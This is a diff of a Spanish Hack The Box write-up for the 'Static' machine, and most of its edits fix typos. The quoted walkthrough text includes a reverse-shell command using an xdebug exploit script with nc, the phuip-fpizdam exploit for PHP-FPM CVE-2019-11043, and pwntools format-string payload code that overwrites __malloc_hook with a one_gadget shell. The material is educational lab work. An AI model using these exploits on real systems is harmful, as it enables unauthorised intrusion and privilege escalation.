@@ -19,7 +19,7 @@
 <meta itemprop=name content="Static">
 <meta itemprop=description content="Hack The Box. Linux. Máquina difícil. Esta máquina contiene una página web que expone un archivo Gzip corrupto que necesita ser corregido para obtener una clave de TOTP y descargar un archivo VPN. Luego, hay algunos servicios PHP vulnerables que pueden ser comprometidos para llegar a un servidor interno que contiene un archivo binario ejecutable que tiene una vulnerabilidad de Format String. Para comprometer esta máquina se necesitan conocimientos avanzados de pivoting y reenvío de puertos, además de enumeración web, explotación de PHP y explotación de Format String. En este write-up se utiliza un script personalizado de Ruby para automatizar el proceso de descarga del archivos VPN, un script de Python para ganar RCE sobre un servidor web PHP y otro script de Python para la explotación del binario mediante Format String"><meta itemprop=datePublished content="2021-12-18T00:00:00+01:00">
 <meta itemprop=dateModified content="2021-12-18T00:00:00+01:00">
-<meta itemprop=wordCount content="5699">
+<meta itemprop=wordCount content="5703">
 <meta itemprop=keywords content="ftp,cve,php,otp,pivoting,capabilities,path-hijacking,port-forwarding,binary-exploitation,format-string,">
 <meta name=twitter:card content="summary">
 <meta name=twitter:title content="Static">
@@ -311,7 +311,7 @@ USE <span style=color:#66d9ef>static</span>;
 </code></pre></div><p>Este archivo SQL crea una tabla llamada <code>users</code> con columnas <code>id</code>, <code>username</code>, <code>password</code> y <code>totp</code>. Y luego se añade un nuevo usuario con nombre <code>admin</code>. Aunque tenemos el <em>hash</em> de la contraseña, si lo rompemos obtendremos <code>admin</code> (algo que ya sabemos). El otro valor es <code>orxxi4c7orxwwzlo</code> para la columna <code>totp</code>.</p>
 <h2 id=gestionando-2fa>Gestionando 2FA</h2>
 <p>Este valor de <code>totp</code> corresponde a la clave utilizada para el algoritmo de TOTP (<em>Time-based One-Time Password</em>). El algoritmo TOTP está implementado en librerías de Python y Ruby (entre otras); y también hay apps como Google Authenticator o soluciones online.</p>
-<p>Como estaba estoy utilizando Ruby esta vez, hagamos esto de TOTP en Ruby también. Primero necesitamos instalar <code>rotp</code> con <code>gem install rotp</code>. Y luego, desde <code>irb</code> (Ruby interactivo) podemos coger el código:</p>
+<p>Como estamos utilizando Ruby esta vez, hagamos esto de TOTP también en Ruby. Primero necesitamos instalar <code>rotp</code> con <code>gem install rotp</code>. Y luego, desde <code>irb</code> (Ruby interactivo) podemos coger el código:</p>
 <div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>$ irb
 irb(main):001:0&gt; require &#39;rotp&#39;
 =&gt; true
@@ -370,7 +370,7 @@ puts <span style=color:#e6db74>&#34;[+] Cookie: </span><span style=color:#e6db74
 <p>Aquí podemos descargar una VPN como archivo <code>.ovpn</code> (como el que se utiliza para conectarse a las máquinas de Hack The Box). Podemos ver también que hay algunas máquinas que deberían ser accesibles utilizando la VPN.</p>
 <p>Solo por completar el <em>script</em> de Ruby, decidí poner todo junto. Como resultado, el <em>script</em> se descarga y parchea el archivo Gzip, extrae la clave de TOTP del contenido SQL, inicia sesión con credenciales y 2FA y finalmente descarga el archivo de VPN como <code>static.ovpn</code>. El <em>script</em> se llama <a href=https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/Static/get_vpn.rb><code>get_vpn.rb</code></a> (explicación detallada <a href=https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/Static#get_vpnrb>aquí</a>).</p>
 <h2 id=conexión-a-la-vpn-de-static>Conexión a la VPN de Static</h2>
-<p>Si ejecutamos <code>openvpn static.ovpn</code>, veremos algunos errores. El problema es que en archivo contiene un subdominio llamado <code>vpn.static.htb</code>:</p>
+<p>Si ejecutamos <code>openvpn static.ovpn</code>, veremos algunos errores. El problema es que el archivo contiene un subdominio llamado <code>vpn.static.htb</code>:</p>
 <div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>$ head static.ovpn
 client
 dev tun9
@@ -420,7 +420,7 @@ PORT   STATE SERVICE
 <p>El archivo <code>info.php</code> muestra un <code>phpinfo()</code> con la configuración de PHP. Después de leer toda la información, descubrimos que <code>xdebug</code> está habilitado:</p>
 <p><img src=/images/HTB/Static/Static-xdebug.png alt="Static web internal xdebug"></p>
 <p>Esto es un problema porque podemos conectarnos al servidor por razones de &ldquo;depuración&rdquo; y ganar ejecución remota de comandos (RCE). Buscando por <em>exploits</em>, podemos encontrar <a href=https://github.com/gteissier/xdebug-shell>este</a>), el cual está hecho en Python versión 2. El <em>exploit</em> funciona y nos otorga una línea de comandos interactiva.</p>
-<p>Decidí traducir el <em>script</em> a Python versión 3 y modificarlo para que me otorgara una <em>reverse shell</em> con <code>nc</code>, lo cual es más cómodo. El <em>exploit</em> resultanta puede encontrarse en: <a href=https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/Static/xdebug_shell.py><code>xdebug_shell.py</code></a> (explicación detallada <a href=https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/Static#xdebug_shellpy>aquí</a>).</p>
+<p>Decidí traducir el <em>script</em> a Python versión 3 y modificarlo para que me otorgara una <em>reverse shell</em> con <code>nc</code>, lo cual es más cómodo. El <em>exploit</em> resultante puede encontrarse en: <a href=https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/Static/xdebug_shell.py><code>xdebug_shell.py</code></a> (explicación detallada <a href=https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/Static#xdebug_shellpy>aquí</a>).</p>
 <p>Podemos utilizar este <em>exploit</em> para ganar acceso al servidor web interno (recuérdese que hay que utilizar la dirección IP que nos otorga la VPN de Static, no la de Hack The Box):</p>
 <div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>$ python3 xdebug_shell.py http://172.20.0.10/info.php 172.30.0.9 <span style=color:#ae81ff>4444</span>
 </code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>$ nc -nlvp <span style=color:#ae81ff>4444</span>
@@ -554,7 +554,7 @@ index.php               [Status: 200, Size: 50022, Words: 6940, Lines: 305]
 uploads                 [Status: 301, Size: 194, Words: 7, Lines: 8]
 </code></pre></div><p>Existe un directorio <code>/uploads</code>, pero el listado de directorios está deshabilitado.</p>
 <h2 id=comprometiendo-otro-servidor-interno>Comprometiendo otro servidor interno</h2>
-<p>Desde la respuesta HTTP anterior, se puede ver que el servidor está utilizando PHP-FPM/7.1. Existe un <em>exploit</em> para esta tecnología, demostrada [aquí] (<a href=https://github.com/neex/phuip-fpizdam>https://github.com/neex/phuip-fpizdam</a>) (CVE-2019-11043).</p>
+<p>Desde la respuesta HTTP anterior, se puede ver que el servidor está utilizando PHP-FPM/7.1. Existe un <em>exploit</em> para esta tecnología, demostrada <a href=https://github.com/neex/phuip-fpizdam>aquí</a> (CVE-2019-11043).</p>
 <p>El <em>exploit</em> consiste en un proyecto en Go que expone una <em>web-shell</em> en la víctima. Vamos a compilar el proyecto:</p>
 <div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>$ git clone https://github.com/neex/phuip-fpizdam
 <span style=color:#960050;background-color:#1e0010>
@@ -664,7 +664,7 @@ www-data@pki:~/html/uploads$ stty rows 50 columns 158
 </code></pre></div><p>Si enumeramos <em>capabilities</em> de sistema, vemos que el binario <code>ersatool</code> tiene <code>cap_setuid+eip</code>:</p>
 <div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>www-data@pki:~/html/uploads$ getcap -r / 2&gt;/dev/null
 /usr/bin/ersatool = cap_setuid+eip
-</code></pre></div><p>Esto significa que en algunos puntos del programa el binario tiene permiso para realizar acciones com permisos elevados (como <code>root</code>). Veamos si hay más archivos relacionados con el binario:</p>
+</code></pre></div><p>Esto significa que en algunos puntos del programa el binario tiene permiso para realizar acciones con permisos elevados (como <code>root</code>). Veamos si hay más archivos relacionados con el binario:</p>
 <div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>www-data@pki:~/html/uploads$ find / -name \*ersatool\* 2&gt;/dev/null
 /usr/src/ersatool.c
 /usr/bin/ersatool
@@ -920,7 +920,7 @@ constraints:
 </span><span style=color:#960050;background-color:#1e0010></span>0x10a38c execve(&#34;/bin/sh&#34;, rsp+0x70, environ)
 constraints:
   [rsp+0x70] == NULL
-</code></pre></div><p>Podemos utilizar <code>0x4f322</code>, por ejemplo. Ahora podemos sobreescribir fácilmente <code>__malloc_hook</code> utilizando <code>pwntools</code> (esta librería tiene una función mágica llamada <code>fmtstr_payload</code> que hace todo el trabajo, specifying the offset, the address and the value to write):</p>
+</code></pre></div><p>Podemos utilizar <code>0x4f322</code>, por ejemplo. Ahora podemos sobreescribir fácilmente <code>__malloc_hook</code> utilizando <code>pwntools</code> (esta librería tiene una función mágica llamada <code>fmtstr_payload</code> que hace todo el trabajo, indicándole el <em>offset</em> la dirección de memoria en la que escribir y el valor a escribir):</p>
 <div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-python data-lang=python>one_gadget_shell <span style=color:#f92672>=</span> libc<span style=color:#f92672>.</span>address <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x4f322</span>
 
 payload <span style=color:#f92672>=</span> fmtstr_payload(
